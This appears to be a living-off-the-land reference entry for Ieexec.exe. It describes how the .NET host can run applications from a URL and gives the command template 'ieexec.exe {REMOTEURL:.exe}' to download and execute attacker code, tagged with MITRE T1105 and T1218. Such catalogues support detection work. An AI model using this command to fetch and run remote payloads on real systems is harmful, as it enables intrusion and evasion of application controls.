title: Ieexec.exe
html:
Ieexec.exe

The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.

Download

Download and run attacker code from remote location

ieexec.exe {REMOTEURL:.exe}

Downloads and executes executable from the remote server. — MITRE: T1105 — Privileges: User

Execute

Download and run attacker code from remote location

ieexec.exe {REMOTEURL:.exe}

Downloads and executes executable from the remote server. — MITRE: T1218 — Privileges: User
